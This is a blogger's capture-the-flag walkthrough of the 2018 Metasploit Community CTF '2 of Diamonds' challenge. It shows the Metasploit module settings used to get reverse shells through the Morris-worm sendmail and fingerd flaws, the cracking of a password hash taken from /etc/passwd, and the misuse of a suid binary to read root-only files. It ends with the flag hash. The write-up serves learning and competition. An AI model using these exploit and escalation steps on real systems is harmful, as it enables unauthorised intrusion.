---
layout: post
title: Metasploit Community CTF 2018 - 2 of Diamonds Write-Up
subtitle: This is a write-up on how I was able to capture the 2 of Diamonds flag in Metasploit Community CTF 2018.
comments: false
categories:
- CTF 
---

Last weekend, I have participated in **Metasploit Community CTF 2018** as part of [hackstreetboys](https://ctftime.org/team/43377) wherein we finished 14th overall out of 1000 teams (~1000 teams registered - but based from Rapid7 stats nearly 600 teams logged in and played over the course of the game, additionally based from the final scoreboard - only 214 out of the 600 were able to score and successfully capture at least a single flag).

Not sure how many CTF teams from Philippines did joined but I saw a couple of usernames on Metasploit CTF slack channel which I'm familiar with. As always, quite happy if I saw a fellow countryman participating in security competitions, as compared to other countries only a few enjoys participating in this kind of activity.
### Metasploit Community CTF 2018 Final Scoreboard (Top 20)
![](https://i.imgur.com/b82jvHd.png){: .mx-auto.d-block :}

For this CTF, I managed to acquire 8 out of the 15 flags (800 pts.) during the time CTF was running. Since some of the challenges I've solved take some time to create a write-up (also don't have screenshots), I will be just creating write-up for 2 of Diamonds since it is the challenge where I have most of my screenshots.
## About Metasploit Community CTF 2018
Brief info on Metasploit Community CTF 2018 can be seen below (**skip this part if you want to read directly the 2 of Diamonds write-up**).

Based from experience participating previous Metasploit CTFs as well as other online CTFs, I could say that Metasploit CTF is one of the rare CTFs that is more geared towards penetration testing. (Took part of it [last year](https://blog.rapid7.com/2017/12/11/congrats-to-the-winners-of-our-2017-community-ctf/), and managed to land on 7th place.)

To get a view on how was it different compared to other online CTFs, below is the dashboard from the just ended Metasploit Community CTF 2018. (Quite cool as every team was given their own Kali instance and target vulnerable Windows and Ubuntu server!)

![](https://i.imgur.com/xj6pjmG.png){: .mx-auto.d-block :}

From it, you could see that each of the 1000 registered team has their own Kali Linux instance as well as vulnerable Windows server and Ubuntu server instance for them to connect to. All of the machines were setup to be the same for all teams. Hence, all of the teams were given exact same environment and it is up for each team to be able to use it effectively; like how they will be using the given Kali Linux instance to hack the other vulnerable servers.

Example screenshot below shows me successfully exploiting the Windows server and gaining access on it then using RDP to look for available flags.

![](https://i.imgur.com/ZX1A2Gj.png){: .mx-auto.d-block :}

Exploiting the Windows server was quite a challenge for me as it was my first time being able to successfully develop an exploit for a running vulnerable service on a Windows server in a CTF (usual CTFs has this type which is categorized as Pwn but it is more on Linux binaries not on Windows). It was also kind of a test for me in terms of what I learned on Windows exploitation development as I just recently acquired the [Offensive Security Certified Expert (OSCE) certification](https://www.youracclaim.com/badges/c005e433-d716-44a2-a157-8e1a522d657c).

In summary, it is needed to use the Kali Linux instance in order to connect and hack your way to find flags on both target Windows and Linux server which in my opinion, the CTF is more geared towards penetration testing and I did enjoyed participating on it.

It is also quite cool as my video [libSSH Authentication Bypass Exploit (CVE-2018-10933) Demo](https://www.youtube.com/watch?v=ZSWQjmfcn4g) contains a direct exploit to gain root access on port 2222 on the Ubuntu instance. A free root shell for me as I know how to exploit it.

A huge thanks to the whole Metasploit Community CTF 2018 organizers and sponsors for making the CTF happen. Learned a lot participating on it.
## 2 of Diamonds Write-Up
Below is the walkthrough on how was I able to get the 2 of Diamonds card.

![](https://i.imgur.com/MWVxNNq.png){: .mx-auto.d-block :}

**Note:** Flags for this event is the MD5 hash of the card image, meaning to say the card data should remain intact and unchanged. This verifies that actual card image was acquired.

Running an nmap scan on the vulnerable Ubuntu server revealed that it has quite a few ports open on it.

For this we would concentrate on **port 25 (smtp service)** and **port 79 (finger service)** as both will lead to the 2 of diamonds card.

![](https://i.imgur.com/g487rxJ.png){: .mx-auto.d-block :}

The port 25 (smtp service) was found running **Sendmail 5.51/5.17** which seems quite odd as conducting research on the Sendmail version shows that the version is really old **(1980's)**.

From it available old Sendmail exploits were researched which led to finding [Morris Worm sendmail Debug Mode Shell Escape](https://www.rapid7.com/db/modules/exploit/unix/smtp/morris_sendmail_debug), a vulnerability exploited by the Morris worm in 1988-11-02. The timeline for the vulnerability seems to match the archaic Sendmail version.

Metasploit was used since module is already available on it.

~~~
use exploit/unix/smtp/morris_sendmail_debug

set RHOSTS 172.16.4.133

set LHOST 172.16.4.132

set LPORT 4444
~~~

Using the exploit, a reverse shell was gained from the vulnerable server.

![](https://i.imgur.com/sau2LV4.png){: .mx-auto.d-block :}

Likewise, it also happened that when researching for the Sendmail vulnerability, a [Morris Worm fingerd Stack Buffer Overflow exploit](https://www.exploit-db.com/exploits/45791) was found which kind of go hand-in-hand with the timeline of the Sendmail vulnerability as this was also exploited by the Morris worm in 1988-11-02.

Since there is a running service on port 79 (finger service), this exploit was also tested.

~~~
use exploit/bsd/finger/morris_fingerd_bof

set RHOSTS 172.16.4.133

set LHOST 172.16.4.132

set LPORT 5555
~~~

The exploit worked as another reverse shell was gained.

![](https://i.imgur.com/ix0SMpD.png){: .mx-auto.d-block :}

The **hostname** of the machine for both reverse shells is the same, which is **2-of-diamonds**. This verified that both of the reverse shell can be used to gain access to same machine (both the services are running on the same machine).

**Note:** Not all services being used on the target vulnerable Ubuntu instance leads to same machine as the Ubuntu instance seems just hosting the dockerized servers.

The reverse shell was then used to enumerate the box.

Lo and behold, some of the machine contents matches the 1980's Morris worm timeline as date modified for some files were way back 1983 to 1986!

![](https://i.imgur.com/xttAA7c.png){: .mx-auto.d-block :}

The hard part of this challenge is that the operating system is quite old which seems there is few information regarding it. Though it was also enjoyable, as this became as a learn as you do experience for me.

Digging more into server shows that it is **4.3 BSD UNIX**.

~~~
cat /etc/motd

4.3 BSD UNIX #1: Fri Jun  6 19:55:29 PDT 1986


Would you like to play a game?
~~~

**Note:** **uname** command doesn't work for the server as [Linux Programmer's Manual verified that there is no uname call in 4.3 BSD](http://man7.org/linux/man-pages/man2/uname.2.html).

The **/usr/guest** directory shows a recently modified account which is hunter and unfortunately only hunter account got read access to the directory.

![](https://i.imgur.com/R8NTAOY.png){: .mx-auto.d-block :}

Checking **/etc/passwd file** and comparing it to the [original passwd file for 4.3BSD](https://www.tuhs.org/cgi-bin/utree.pl?file=4.3BSD-UWisc/src/sys/dist/passwd) verified that the user hunter was added (also noticeable, it has **/bin/sh** compared to others which have **/bin/csh**).

~~~
cat /etc/passwd

root:*:0:10:Charlie &amp;:/:/bin/csh

toor:*:0:10:Bourne-again Superuser:/:

daemon:*:1:31:The devil himself:/:

operator::2:28:System &amp;:/usr/guest/operator:/bin/csh

uucp::66:1:UNIX-to-UNIX Copy:/usr/spool/uucppublic:/usr/lib/uucp/uucico

nobody:*:32767:9999:Unprivileged user:/nonexistent:/dev/null

notes:*:5:31:Notesfile maintainer:/usr/spool/notes:/bin/csh

karels:QOrZFUGpxDUlo:6:10:Mike &amp;:/usr/guest/karels:/bin/csh

sam:Yd6H6R7ejeIP2:7:10:&amp; Leffler:/usr/guest/sam:/bin/csh

wnj:ZDjXDBwXle2gc:8:10:Bill Joy:/usr/guest/wnj:/bin/csh

mckusick:6l7zMyp8dZLZU:201:10:Kirk &amp;:/usr/guest/mckusick:/bin/csh

dmr:AiInt5qKdjmHs:10:31:Dennis Ritchie:/usr/guest/dmr:

ken:sq5UDrPlKj1nA:11:31:&amp; Thompson:/usr/guest/ken:

shannon:NYqgD2jjeuozk:12:31:Bill &amp;:/usr/guest/shannon:/bin/csh

peter:y5G5mbEX4HhOY:13:31:peter b. kessler:/usr/guest/peter:/bin/csh

kre:vpyVBWM3ARc0.:14:31:Robert Elz:/usr/guest/kre:/bin/csh

ingres:64c19dZOElp9I:267:74:&amp; Group:/usr/ingres:/bin/csh

ralph:s.EZm/wQTqbro:16:31:&amp; Campbell:/usr/guest/ralph:/bin/csh

linton:1/WWIjn5Sd8qM:19:31:Mark &amp;:/usr/guest/linton:/bin/csh

sklower:p0taJy06Qye1g:20:31:Keith &amp;:/usr/guest/sklower:/bin/csh

eric:PcEfNNJN.UHpM:22:31:&amp; Allman:/usr/guest/eric:/usr/new/csh

rrh:lj1vXnxTAPnDc:23:31:Robert R. Henry:/usr/guest/rrh:/bin/csh

arnold:5vTJh54EqjZsU:25:31:Kenneth C R C &amp;:/usr/guest/arnold:/bin/csh

jkf:G6cip/I8C792U:26:31:John Foderaro:/usr/guest/jkf:/bin/csh

ghg:FA/4weg1/wy2c:32:31:George Goble:/usr/guest/ghg:/bin/csh

bloom:n0QtVD80F82MM:33:10:Jim &amp;:/usr/guest/bloom:/bin/csh

miriam:hnZ1ZK5H2qapE:36:10:&amp; Amos:/usr/guest/miriam:/bin/csh

kjd:ogYPQZGnihezk:37:10:Kevin Dunlap:/usr/guest/kjd:/bin/csh

rwh:LReNSwE9gQF7w:38:10:Robert W. Henry:/usr/guest/rwh:/bin/csh

tef:OciUqGHcs9YOw:39:31:Thomas Ferrin:/usr/guest/tef:/bin/csh

van:STpwu/Ggmk78A:40:31:&amp; Jacobson:/usr/guest/van:/bin/csh

rich:uxxJaRZvgyiPg:41:31:&amp; Hyde:/usr/guest/rich:/bin/csh

jim:.6s.pzMqjyMrU:42:10:&amp; McKie:/usr/guest/jim:/bin/csh

donn:5cJ5uHclmVJKA:43:31:&amp; Seeley:/usr/guest/donn:/bin/csh

falcon:.MTZpW8TC8tqs:32766:31:Prof. Steven &amp;:/usr/games:/usr/games/wargames

hunter:IE4EHKRqf6Wvo:32765:31:Hunter Hedges:/usr/guest/hunter:/bin/sh
~~~

The **/usr/spool/mail** directory also has a recently modified file with filename **hunter**.

![](https://i.imgur.com/iCo4wr1.png){: .mx-auto.d-block :}

Reading the file hunter contents shows the following mail.

![](https://i.imgur.com/wd6Ai5x.png){: .mx-auto.d-block :}

~~~
cat /usr/spool/mail/hunter

From cliff Wed Sep 10 12:34:42 1986

Received: by 2-of-diamonds (5.51/5.17)

id AA00579; Wed, 10 Sep 86 12:34:42 PDT

Date: Wed, 10 Sep 86 12:34:42 PDT

From: cliff (Cliff Stoll)

Message-Id: &lt;8610210434.AA00579@2-of-diamonds&gt;

To: mcnatt@26.0.0.113

Subject: What do you know about the nesting habits of cuckoos?

Status: RO


He went looking for your Gnu-Emacs move-mail file.
~~~

The text file is a reference for **[The Cuckoo's Egg: Tracking a Spy Through the Maze of Computer Espionage](https://en.wikipedia.org/wiki/The_Cuckoo%27s_Egg)**, a 1989 book written by Clifford Stoll. It is his first-person account of the hunt for a computer hacker who broke into a computer at the Lawrence Berkeley National Laboratory (LBNL).

Reading some of the contents of the book, I noticed that there was a line that says a change password command was executed by the hacker, and changed Hunter's password as "**Hedges**".

![](https://i.imgur.com/tVthr0O.png){: .mx-auto.d-block :}

A quick **su hunter** command was then run but unfortunately "**Hedges**" was not the password for the hunter user in the box.

Researching more on the traditional cryptography used for the passwords, it was found that the password scheme used is a [modified DES](https://www.usenix.org/legacy/publications/library/proceedings/usenix99/full_papers/provos/provos_html/node9.html).

The 13 printable ASCII characters seems to match "**IE4EHKRqf6Wvo**" on hunter user entry on the **/etc/passwd** file.

~~~
hunter:IE4EHKRqf6Wvo:32765:31:Hunter Hedges:/usr/guest/hunter:/bin/sh
~~~

Running the hash on john seems able to detect what kind of hash it is and was able to crack it.

![](https://i.imgur.com/vpBHGDQ.png){: .mx-auto.d-block :}

hunter user has the password **msfhack**.

Running **su hunter** with the **msfhack** verified that the password worked.

![](https://i.imgur.com/yNMY4DN.png){: .mx-auto.d-block :}

Gaining access as hunter, I then rechecked the **/usr/guest/hunter** directory as hunter user got permissions for it.

The directory contains a suid **movemail** binary and a **.history** file.

The **movemail** binary is interesting as it is **suid** and owned by root.

![](https://i.imgur.com/VzKTikk.png){: .mx-auto.d-block :}

What the binary with root permission does is that it moves the target file to another file without deleting the original file (though original file becomes empty) and was given new file with **–rw-rw-rw-** permissions.

Below is a screenshot that shows where a file was created then used **movemail** binary to move it to another file

**Note:** All of the contents of the moved file will be removed (but it will retain the original file - though no content on it) as well as it won't work if the target output file already exists. (Experimented on a few things using the binary like trying to modify /etc/passwd with controlled contents but failed to do so.)

![](https://i.imgur.com/ES1jOaI.png){: .mx-auto.d-block :}

While the binary is useful, I can't figure out how to use it at this point, so more enumeration was done on the box.

This is where the **/usr/games** directory was found where it has a certain **adventure** binary with root only permissions and is just recently modified.

![](https://i.imgur.com/s2GTR86.png){: .mx-auto.d-block :}

This makes it look like the "**Would you like to play a game?**" on **/etc/motd file** is a subtle hint for capturing the flag.

On the **/usr/games/lib** directory a** 2_of_diamonds.dat** file was also found!

![](https://i.imgur.com/8MRTy7g.png){: .mx-auto.d-block :}

Since both files are only readable and accessible by root, the movemail binary was then used to copy its contents and make it readable.

~~~
/usr/guest/hunter/movemail /usr/games/lib/2_of_diamonds.dat /tmp/2_of_diamonds.dat

/usr/guest/hunter/movemail /usr/games/adventure /tmp/adventure
~~~

At this point, I looked for ways on how to do post exploitation and download the files.

Metasploit was quite helpful for this as it directly offers way on how to download the said files.

![](https://i.imgur.com/9z9ygl0.png){: .mx-auto.d-block :}

But unfortunately for me, downloading both files using the reverse shell on morris_sendmail_debug exploit seems to fail, as I ended not being able to download it as well as it kills my shell.

Since there is also a reverse shell gained from the morris_fingerd_bof, it was it that was used to download the files.

Additionally, I've created another directory for the files, then copied the files on it and change permission to world writable.

~~~
mkdir hunter

cp 2_of_diamonds.dat hunter/

cp adventure hunter/

cd hunter

chmod 777 adventure

chmod 777 2_of_diamonds.dat
~~~

The files were then downloaded on the Kali instance to examine it better.

![](https://i.imgur.com/oFJOf3F.png){: .mx-auto.d-block :}

The **2_of_diamonds.dat** file seems to have **encrypted** contents while the **adventure** file seems to be a 32-bit pure executable little-endian file. (I tried to execute the adventure file but failed to do so.)

![](https://i.imgur.com/qRiGRcT.png){: .mx-auto.d-block :}

Going back to the 2-of-diamonds machine. Running the **adventure** binary seems to work.

The binary lets you play [Collossal Cave Adventure](https://en.wikiquote.org/wiki/Colossal_Cave_Adventure) (aka Adventure, ADVENT, Collosal Cave) which was said to be the [first ever text adventure game](https://motherboard.vice.com/en_us/article/ywmyn5/the-first-text-adventure-game-ever-is-finally-open-source).

![](https://i.imgur.com/qKHMy7x.png){: .mx-auto.d-block :}

I've then looked for various walkthroughs on how to correctly play the game and this [walkthrough](https://github.com/brandon-rhodes/python-adventure/blob/master/adventure/tests/walkthrough2.txt) helped me slay the dragon and loot the flag in game.

![](https://i.imgur.com/R9d9ZyP.png){: .mx-auto.d-block :}

Fun part of it was able to see vanquishing the dragon with just bare hands.

Slaying the dragon will drop an item called flag as a loot. (Original game would be a persian rug item instead of flag.)

![](https://i.imgur.com/dfAkeuR.png){: .mx-auto.d-block :}

Going back from adventure and acquiring the flag will output a message saying that crypt(1) "**wyvern**" is the password for the **2_of_diamonds.dat** file.

![](https://i.imgur.com/tVQxEMK.png){: .mx-auto.d-block :}

This seems to be an easter egg as "**wyvern**" was also mentioned in the **Cuckoo's Egg** book as the system manager's password. (A screenshot of the text from the book can be seen below talking about the password.)

![](https://i.imgur.com/YNqDAWK.png){: .mx-auto.d-block :}

Didn't know about **crypt(1)** but researching on it shows that it [can be used to decrypt a file](https://www.freebsd.org/cgi/man.cgi?query=crypt&amp;sektion=1).

crypt was then used to decrypt the 2_of_diamonds.dat file.

![](https://i.imgur.com/fiPo3ID.png){: .mx-auto.d-block :}

Finally, the 2 of Diamonds card image was found.

The 2_of_diamonds.png file was then downloaded to the Kali instance.

Checking the file shows that it is a valid png file thus md5 hash was then acquired which is the correct flag!

![](https://i.imgur.com/DyBKqnL.png){: .mx-auto.d-block :}

2 of Diamonds flag (md5 hash of the 2 of Diamonds image file): **46ff82c72e7491a451fef2e335dcb912**

**2 of Diamonds flag challenge was successfully completed.**
